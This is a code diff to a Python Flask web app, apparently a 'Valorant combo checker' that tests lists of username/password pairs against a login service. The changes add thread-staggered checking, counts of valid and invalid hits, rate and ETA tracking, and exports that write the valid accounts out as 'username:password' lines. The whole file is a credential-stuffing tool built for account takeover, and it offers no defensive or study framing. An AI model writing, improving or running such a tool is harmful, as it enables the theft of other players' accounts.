@@ -63,9 +63,27 @@ class ComboChecker:
         self.is_checking = False
         self.stop_checking = False
         self.results = []
-        self.progress = {'current': 0, 'total': 0}
+        self.progress = {
+            'current': 0, 
+            'total': 0, 
+            'rate': 0, 
+            'eta': 0,
+            'valid_count': 0,
+            'invalid_count': 0,
+            'error_count': 0,
+            'success_rate': 0.0
+        }
         self.results_lock = threading.Lock()
         self.progress_lock = threading.Lock()
+        self.session_stats = {
+            'start_time': None,
+            'end_time': None,
+            'total_processed': 0,
+            'fastest_response': None,
+            'slowest_response': None,
+            'average_response_time': 0.0,
+            'response_times': []
+        }
         
     def check_single_combo(self, username: str, password: str) -> Dict:
         """Check a single username/password combination"""
@@ -204,6 +222,8 @@ class ComboChecker:
     
     def _check_combo_with_delay(self, username: str, password: str, index: int) -> Dict:
         """Check a single combo with smart delay management for threading"""
+        start_request_time = time.time()
+        
         # Stagger the start times to avoid overwhelming the server
         if index > 0:
             # Add a small random delay based on thread index to spread out requests
@@ -211,6 +231,33 @@ class ComboChecker:
             time.sleep(thread_delay)
         
         result = self.check_single_combo(username, password)
+        
+        # Track response times for statistics
+        response_time = time.time() - start_request_time
+        result['response_time'] = round(response_time, 2)
+        
+        with self.progress_lock:
+            self.session_stats['response_times'].append(response_time)
+            if self.session_stats['fastest_response'] is None or response_time < self.session_stats['fastest_response']:
+                self.session_stats['fastest_response'] = response_time
+            if self.session_stats['slowest_response'] is None or response_time > self.session_stats['slowest_response']:
+                self.session_stats['slowest_response'] = response_time
+            
+            # Update statistics
+            if len(self.session_stats['response_times']) > 0:
+                self.session_stats['average_response_time'] = sum(self.session_stats['response_times']) / len(self.session_stats['response_times'])
+            
+            # Update progress counters
+            if result.get('status') == 'valid':
+                self.progress['valid_count'] += 1
+            elif result.get('status') == 'invalid':
+                self.progress['invalid_count'] += 1
+            else:
+                self.progress['error_count'] += 1
+            
+            total_checked = self.progress['valid_count'] + self.progress['invalid_count'] + self.progress['error_count']
+            if total_checked > 0:
+                self.progress['success_rate'] = (self.progress['valid_count'] / total_checked) * 100
         
         # Apply the main delay between requests (but not for the first batch)
         if index >= self.max_workers:
@@ -365,11 +412,28 @@ def batch_status(session_id):
     
     checker = active_sessions[session_id]
     
+    # Calculate real-time rate and ETA
+    current_time = time.time()
+    if checker.is_checking and hasattr(checker, 'start_time') and checker.start_time:
+        elapsed = current_time - checker.start_time
+        if elapsed > 0:
+            rate = len(checker.results) / elapsed * 60  # per minute
+            remaining = checker.progress['total'] - checker.progress['current']
+            eta = (remaining / rate * 60) if rate > 0 else 0
+            checker.progress['rate'] = round(rate, 1)
+            checker.progress['eta'] = round(eta)
+    
     return jsonify({
         'is_checking': checker.is_checking,
         'progress': checker.progress,
-        'results': checker.results,
-        'completed': not checker.is_checking and checker.progress['current'] > 0
+        'results': checker.results[-10:] if len(checker.results) > 10 else checker.results,  # Last 10 for live view
+        'total_results': len(checker.results),
+        'completed': not checker.is_checking and checker.progress['current'] > 0,
+        'session_stats': {
+            'fastest_response': round(checker.session_stats['fastest_response'], 2) if checker.session_stats['fastest_response'] else None,
+            'slowest_response': round(checker.session_stats['slowest_response'], 2) if checker.session_stats['slowest_response'] else None,
+            'average_response_time': round(checker.session_stats['average_response_time'], 2)
+        }
     })
 
 @app.route('/api/stop_batch/<session_id>', methods=['POST'])
@@ -385,27 +449,93 @@ def stop_batch(session_id):
 
 @app.route('/api/export_results/<session_id>')
 def export_results(session_id):
-    """API endpoint to export results"""
+    """Export results in various formats with enhanced statistics"""
     if session_id not in active_sessions:
         return jsonify({'error': 'Session not found'}), 404
     
     checker = active_sessions[session_id]
+    export_format = request.args.get('format', 'json').lower()
     
     if not checker.results:
         return jsonify({'error': 'No results to export'}), 400
     
-    # Generate export data
-    export_data = {
-        'summary': {
-            'total': len(checker.results),
-            'valid': sum(1 for r in checker.results if r['status'] == 'valid'),
-            'invalid': sum(1 for r in checker.results if r['status'] == 'invalid'),
-            'errors': sum(1 for r in checker.results if r['status'] not in ['valid', 'invalid'])
-        },
-        'results': checker.results
-    }
+    if export_format == 'csv':
+        import csv
+        import io
+        
+        output = io.StringIO()
+        writer = csv.writer(output)
+        
+        # Write header
+        writer.writerow(['Username', 'Password', 'Status', 'Message', 'Response Time (s)', 'Timestamp'])
+        
+        # Write data
+        for result in checker.results:
+            writer.writerow([
+                result['username'],
+                result['password'],
+                result['status'],
+                result['message'],
+                result.get('response_time', ''),
+                time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(result['timestamp']))
+            ])
+        
+        output.seek(0)
+        from flask import Response
+        
+        return Response(
+            output.getvalue(),
+            mimetype='text/csv',
+            headers={'Content-Disposition': f'attachment; filename="valorant_results_{session_id[:8]}.csv"'}
+        )
     
-    return jsonify(export_data)
+    elif export_format == 'txt':
+        output_lines = []
+        output_lines.append("=== VALORANT COMBO CHECKER RESULTS ===")
+        output_lines.append(f"Session: {session_id}")
+        output_lines.append(f"Total Checked: {len(checker.results)}")
+        output_lines.append(f"Valid: {checker.progress['valid_count']}")
+        output_lines.append(f"Invalid: {checker.progress['invalid_count']}")
+        output_lines.append(f"Errors: {checker.progress['error_count']}")
+        output_lines.append(f"Success Rate: {checker.progress['success_rate']:.1f}%")
+        output_lines.append(f"Average Response Time: {checker.session_stats['average_response_time']:.2f}s")
+        output_lines.append("")
+        
+        # Add valid accounts only
+        valid_results = [r for r in checker.results if r['status'] == 'valid']
+        if valid_results:
+            output_lines.append("=== VALID ACCOUNTS ===")
+            for result in valid_results:
+                output_lines.append(f"{result['username']}:{result['password']}")
+        else:
+            output_lines.append("=== NO VALID ACCOUNTS FOUND ===")
+        
+        from flask import Response
+        
+        return Response(
+            '\n'.join(output_lines),
+            mimetype='text/plain',
+            headers={'Content-Disposition': f'attachment; filename="valorant_valid_{session_id[:8]}.txt"'}
+        )
+    
+    else:  # JSON format
+        export_data = {
+            'session_id': session_id,
+            'export_timestamp': time.time(),
+            'statistics': {
+                'total_checked': len(checker.results),
+                'valid_count': checker.progress['valid_count'],
+                'invalid_count': checker.progress['invalid_count'],
+                'error_count': checker.progress['error_count'],
+                'success_rate': checker.progress['success_rate'],
+                'average_response_time': checker.session_stats['average_response_time'],
+                'fastest_response': checker.session_stats['fastest_response'],
+                'slowest_response': checker.session_stats['slowest_response']
+            },
+            'results': checker.results
+        }
+        
+        return jsonify(export_data)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
